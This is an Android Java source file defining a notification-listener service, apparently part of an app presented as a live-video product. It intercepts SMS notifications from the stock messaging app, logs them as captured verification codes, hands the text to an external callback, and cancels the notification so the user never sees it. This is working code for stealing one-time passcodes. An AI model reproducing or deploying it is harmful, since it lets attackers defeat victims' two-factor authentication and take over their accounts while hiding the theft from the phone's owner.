package com.le.xiong.live.video.service;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.text.SpannableString;

import androidx.annotation.RequiresApi;

import com.le.xiong.live.video.util.MsgSrviceUtil;
import com.le.xiong.live.video.util.SystemUtils;

@RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
public class MsgService extends NotificationListenerService {

    @Override
    public void onListenerConnected() {
        //当连接成功时调用，一般在开启监听后会回调一次该方法
        super.onListenerConnected();
        SystemUtils.writeLog("启动服务：开启服务成功");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        //当收到一条消息时回调，sbn里面带有这条消息的具体信息
        try{
            Bundle extras = null;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    extras = sbn.getNotification().extras;
                }
            }
            if (extras!=null){
                @SuppressLint("InlinedApi")
                String content = extras.get(Notification.EXTRA_TEXT)+""; //通知内容
                if (sbn.getPackageName().equals("com.android.mms")){
                    if (MsgSrviceUtil.getMsgCall()!=null){
                        SystemUtils.writeLog("拦截：成功拦截到验证码短信->\r\n"+content+"\r\n");
                        MsgSrviceUtil.getMsgCall().newMsg(content);
                        SystemUtils.writeLog("拦截：开始拦截通知");
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            cancelNotification(sbn.getKey());
                            SystemUtils.writeLog("拦截：通知拦截成功");
                        }else {
                            SystemUtils.writeLog("错误->Android版本过低消息拦截失败！");
                        }
                    }else {
                        SystemUtils.writeLog("错误->未设置拦截回调方法");
                    }
                }else {
                    SystemUtils.writeLog("拦截：拦截到不含验证码短信 自动放行->\r\n"+content+"\r\n");
                }
            }
        } catch (Exception e) {
            SystemUtils.writeLog("错误->"+e.getMessage());
        }

    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        //当移除一条消息的时候回调，sbn是被移除的消息
        //super.onNotificationRemoved(sbn);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        SystemUtils.writeLog("服务->服务停止");
    }
}
